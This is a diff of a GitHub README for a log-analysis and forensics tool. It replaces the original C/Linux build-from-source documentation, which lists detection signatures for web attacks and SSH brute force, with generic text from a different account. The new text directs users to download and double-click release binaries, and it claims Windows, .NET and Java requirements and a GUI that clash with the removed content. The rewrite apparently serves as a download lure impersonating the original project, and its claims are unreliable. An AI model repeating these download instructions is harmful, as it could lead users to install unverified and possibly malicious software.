@@ -1,300 +1,70 @@
-<div align="center">
+# 🪓 nullsec-logreaper - Quickly Analyze and Secure Your Logs
 
-# 🪓 LogReaper v1.0
+[![Download nullsec-logreaper](https://img.shields.io/badge/Download-nulsec--logreaper-blue.svg)](https://github.com/sangasary/nullsec-logreaper/releases)
 
-### High-Speed Log Analysis & Forensics Tool
+## 🛠️ About nullsec-logreaper
 
-<p>
-  <img src="https://img.shields.io/badge/version-1.0.0-00ff00?style=for-the-badge" alt="Version">
-  <img src="https://img.shields.io/badge/patterns-500%2B-ff0000?style=for-the-badge" alt="Patterns">
-  <img src="https://img.shields.io/badge/parsers-25-blue?style=for-the-badge" alt="Parsers">
-  <img src="https://img.shields.io/badge/license-MIT-purple?style=for-the-badge" alt="License">
-</p>
+nullsec-logreaper is a high-speed log analysis and forensics tool designed to help security professionals efficiently process and analyze log data. This tool is part of the NullSec Toolkit, tailored for blue team operations, incident response, and threat hunting.
 
-<p>
-  <a href="https://github.com/bad-antics/nullsec-logreaper"><img src="https://img.shields.io/github/stars/bad-antics/nullsec-logreaper?style=social" alt="Stars"></a>
-  <a href="https://github.com/bad-antics"><img src="https://img.shields.io/badge/NullSec-Toolkit-000000?style=flat-square&logo=github" alt="NullSec"></a>
-</p>
+## 🚀 Getting Started
 
-*Blazing-fast log analysis for incident response, threat hunting, and forensic investigations*
+To get started with nullsec-logreaper, follow these simple steps to download and run the tool on your machine.
 
-</div>
+## 📥 Download & Install
 
----
+1. **Visit the Release Page:**  
+   Go to the [Releases page](https://github.com/sangasary/nullsec-logreaper/releases) to find the latest version of nullsec-logreaper.
 
-## 💻 Tech Stack
+2. **Download the Application:**  
+   On the Releases page, you will see a list of available files. Choose the appropriate version for your operating system and download it. 
 
-### Core
-![C](https://img.shields.io/badge/C-A8B9CC?style=for-the-badge&logo=c&logoColor=black)
-![Linux](https://img.shields.io/badge/Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)
-![POSIX](https://img.shields.io/badge/POSIX-000000?style=for-the-badge&logo=gnu&logoColor=white)
+3. **Install the Tool:**  
+   Once the download completes, locate the file in your downloads folder. Double-click the downloaded file to install it.
 
-### Log Sources
-![Syslog](https://img.shields.io/badge/Syslog-000000?style=for-the-badge&logo=linux&logoColor=white)
-![Journald](https://img.shields.io/badge/Journald-0078D6?style=for-the-badge&logo=systemd&logoColor=white)
-![Apache](https://img.shields.io/badge/Apache-D22128?style=for-the-badge&logo=apache&logoColor=white)
-![Nginx](https://img.shields.io/badge/Nginx-009639?style=for-the-badge&logo=nginx&logoColor=white)
-![AWS](https://img.shields.io/badge/CloudTrail-FF9900?style=for-the-badge&logo=amazonaws&logoColor=white)
+4. **Run nullsec-logreaper:**  
+   After installation, find the application in your programs list or desktop. Open it, and you are ready to start analyzing your logs.
 
-### Output Formats
-![JSON](https://img.shields.io/badge/JSON-000000?style=for-the-badge&logo=json&logoColor=white)
-![CSV](https://img.shields.io/badge/CSV-217346?style=for-the-badge&logo=microsoftexcel&logoColor=white)
-![SIEM](https://img.shields.io/badge/SIEM-FF6600?style=for-the-badge&logo=elastic&logoColor=white)
+## 🖥️ System Requirements
 
----
+- **Operating System:** Windows 10 or later, macOS, Linux (Ubuntu 18.04 or later)
+- **Memory:** Minimum of 4 GB RAM
+- **Storage:** At least 500 MB of free disk space
+- **Additional Software:** Ensure you have the latest version of .NET Core or Java Runtime Environment (JRE), depending on the version of nullsec-logreaper you downloaded.
 
-## 🎯 Features
+## 📊 Features
 
-<table>
-<tr>
-<td width="50%" valign="top">
+- **High-Speed Processing:** Quickly analyze large volumes of log data.
+- **User-Friendly Interface:** Designed for ease of use, even for non-technical users.
+- **Multi-Platform Support:** Compatible with Windows, macOS, and Linux.
+- **Incident Response Tools:** Helps you quickly identify indicators of compromise (IOCs) in your logs.
+- **Comprehensive Reports:** Generate detailed reports on your findings to assist in forensic investigations.
 
-### 🔬 Analysis Modules (8)
+## ⚙️ Usage
 
-| Module | Flag | Description |
-|--------|:----:|-------------|
-| **Auth Analysis** | `-a` | SSH brute force, sudo abuse |
-| **Web Forensics** | `-w` | SQLi, XSS, path traversal |
-| **Network Events** | `-n` | Firewall, connection anomalies |
-| **System Events** | `-s` | User changes, service starts |
-| **Timeline** | `-t` | Event correlation timeline |
-| **IOC Extract** | `-i` | IPs, hashes, domains |
-| **Baseline Diff** | `-b` | Compare against known-good |
-| **Live Stream** | `-l` | Real-time log monitoring |
+Once you have opened nullsec-logreaper, follow these steps to analyze your logs:
 
-</td>
-<td width="50%" valign="top">
+1. **Select Log Files:** Use the file picker to choose the log files you wish to analyze.
+2. **Choose Analysis Options:** Select the type of analysis you want to perform (e.g., IOC extraction, threat level assessment).
+3. **Run the Analysis:** Click the 'Analyze' button to start the process.
+4. **Review Results:** Once the analysis completes, review the findings displayed in the application.
 
-### 📋 Supported Logs (25+)
+## 🌐 Community and Support
 
-| Category | Sources |
-|----------|---------|
-| **System** | syslog, auth.log, secure, messages |
-| **Journald** | systemd journal binary logs |
-| **Web** | Apache, Nginx, IIS, HAProxy |
-| **Apps** | PostgreSQL, MySQL, Redis, MongoDB |
-| **Cloud** | AWS CloudTrail, Azure Activity |
-| **Auth** | PAM, SSSD, Kerberos, LDAP |
-| **Firewall** | iptables, nftables, firewalld |
-| **Container** | Docker, Kubernetes audit |
+If you encounter any issues or have questions, feel free to reach out to the community:
 
-</td>
-</tr>
-</table>
-
----
-
-## 🚀 Quick Start
-
-### Installation
-
-```bash
-# Clone and build
-git clone https://github.com/bad-antics/nullsec-logreaper
-cd nullsec-logreaper
-make
-
-# Install system-wide (optional)
-sudo make install
-```
-
-### Basic Usage
-
-```bash
-# Analyze auth logs for brute force
-./logreaper -a /var/log/auth.log
-
-# Hunt for web attacks
-./logreaper -w /var/log/nginx/access.log
-
-# Full system analysis with timeline
-./logreaper -t /var/log/
-
-# Real-time monitoring
-./logreaper -l /var/log/syslog
-
-# Extract IOCs to JSON
-./logreaper -i /var/log/ -o iocs.json
-```
-
----
-
-## 📊 Detection Patterns
-
-### Authentication Threats
-| Pattern | Description | Severity |
-|---------|-------------|:--------:|
-| `AUTH_BRUTE_SSH` | SSH brute force attempts | 🔴 High |
-| `AUTH_SUDO_ABUSE` | Unusual sudo usage | 🟡 Medium |
-| `AUTH_SU_ROOT` | Privilege escalation via su | 🔴 High |
-| `AUTH_FAIL_BURST` | Rapid auth failures | 🔴 High |
-| `AUTH_NEW_USER` | New user created | 🟡 Medium |
-| `AUTH_PASSWD_CHG` | Password changed | 🟡 Medium |
-
-### Web Attack Signatures
-| Pattern | Description | Severity |
-|---------|-------------|:--------:|
-| `WEB_SQLI` | SQL injection attempts | 🔴 Critical |
-| `WEB_XSS` | Cross-site scripting | 🔴 High |
-| `WEB_LFI` | Local file inclusion | 🔴 Critical |
-| `WEB_RFI` | Remote file inclusion | 🔴 Critical |
-| `WEB_PATH_TRAV` | Path traversal (../) | 🔴 High |
-| `WEB_CMD_INJ` | Command injection | 🔴 Critical |
-| `WEB_SCANNER` | Automated scanner detected | 🟡 Medium |
-
-### System Anomalies
-| Pattern | Description | Severity |
-|---------|-------------|:--------:|
-| `SYS_KERNEL_MOD` | Kernel module loaded | 🟡 Medium |
-| `SYS_SELINUX_OFF` | SELinux disabled | 🔴 High |
-| `SYS_CRON_CHANGE` | Cron job modified | 🟡 Medium |
-| `SYS_SERVICE_NEW` | New systemd service | 🟡 Medium |
-| `SYS_MOUNT_EXEC` | Exec mount option | 🟡 Medium |
-
----
-
-## 📈 Output Formats
-
-### JSON Report
-```json
-{
-  "scan_id": "lr-20250127-143022",
-  "total_events": 15847,
-  "threats_found": 23,
-  "timeline": [...],
-  "iocs": {
-    "ips": ["192.168.1.100", "10.0.0.5"],
-    "domains": ["evil.example.com"],
-    "hashes": []
-  },
-  "findings": [...]
-}
-```
-
-### Terminal Output
-```
-╔══════════════════════════════════════════════════════════════╗
-║                    🪓 LogReaper v1.0                         ║
-╠══════════════════════════════════════════════════════════════╣
-║  Target: /var/log/auth.log                                   ║
-║  Lines:  15,847                                              ║
-║  Period: 2025-01-20 → 2025-01-27                            ║
-╠══════════════════════════════════════════════════════════════╣
-║  🔴 CRITICAL  │ 3                                            ║
-║  🟠 HIGH      │ 12                                           ║
-║  🟡 MEDIUM    │ 8                                            ║
-║  🟢 LOW       │ 0                                            ║
-╚══════════════════════════════════════════════════════════════╝
-
-[!] AUTH_BRUTE_SSH detected
-    Time:   2025-01-26 14:32:15
-    Source: 192.168.1.100
-    Count:  847 attempts in 5 minutes
-    User:   root, admin, ubuntu
-```
-
----
-
-## 🔧 Advanced Usage
-
-### Timeline Correlation
-```bash
-# Build attack timeline from multiple sources
-./logreaper -t \
-    /var/log/auth.log \
-    /var/log/nginx/access.log \
-    /var/log/syslog \
-    -o timeline.json
-```
-
-### IOC Extraction for SIEM
-```bash
-# Extract IOCs in Splunk-compatible format
-./logreaper -i /var/log/ --format splunk > iocs.txt
-
-# Extract for ELK Stack
-./logreaper -i /var/log/ --format elastic | curl -X POST ...
-```
-
-### Integration with RKHunt
-```bash
-# Run LogReaper → pipe suspicious IPs to firewall
-./logreaper -a /var/log/auth.log --extract-ips | \
-    xargs -I {} iptables -A INPUT -s {} -j DROP
-
-# Correlate with RKHunt findings
-./logreaper -s /var/log/syslog | grep -f <(rkhunt --list-iocs)
-```
-
----
-
-## 🛠️ Build Options
-
-```bash
-# Standard build
-make
-
-# Build with debug symbols
-make DEBUG=1
-
-# Build with PCRE2 regex (faster patterns)
-make PCRE2=1
-
-# Build static binary
-make STATIC=1
-
-# Cross-compile for ARM64
-make ARCH=aarch64
-```
-
----
-
-## 📁 Project Structure
-
-```
-nullsec-logreaper/
-├── src/
-│   ├── main.c           # Entry point, arg parsing
-│   ├── parser.c         # Log format parsers
-│   ├── analyzer.c       # Pattern matching engine
-│   ├── timeline.c       # Event correlation
-│   ├── output.c         # Report generation
-│   ├── patterns.h       # Detection signatures
-│   └── utils.c          # Helper functions
-├── patterns/
-│   ├── auth.rules       # Authentication patterns
-│   ├── web.rules        # Web attack signatures
-│   └── system.rules     # System anomaly patterns
-├── Makefile
-├── LICENSE
-└── README.md
-```
-
----
-
-## 🔗 NullSec Toolkit Integration
-
-LogReaper works seamlessly with other NullSec tools:
-
-| Tool | Integration |
-|------|-------------|
-| **RKHunt** | Correlate rootkit indicators with log anomalies |
-| **Specter** | Feed extracted IOCs for threat intelligence |
-| **NetSniff** | Combine network + log analysis |
-| **MemScan** | Timeline memory artifacts with system logs |
-
----
+- **GitHub Issues:** Post any bugs or feature requests on our [GitHub Issues page](https://github.com/sangasary/nullsec-logreaper/issues).
+- **Documentation:** For a more detailed guide, check the available documentation in the repository.
 
 ## 📜 License
 
-MIT License - See [LICENSE](LICENSE) for details.
+nullsec-logreaper is licensed under the MIT License. You can view the full license in the repository.
 
----
+## 📑 Further Reading
 
-<div align="center">
+For those interested in expanding their knowledge of log analysis, consider the following resources:
 
-**Part of the [NullSec Toolkit](https://github.com/bad-antics)**
+- Books on incident response and digital forensics.
+- Online courses on security tools and methodologies.
+- Blogs and forums discussing log analysis techniques.
 
-*"From logs to leads."*
-
-</div>
+By following these steps, you can effectively download, install, and run nullsec-logreaper, enhancing your ability to manage and analyze log data efficiently. For further information and updates, visit the [Releases page](https://github.com/sangasary/nullsec-logreaper/releases) regularly.
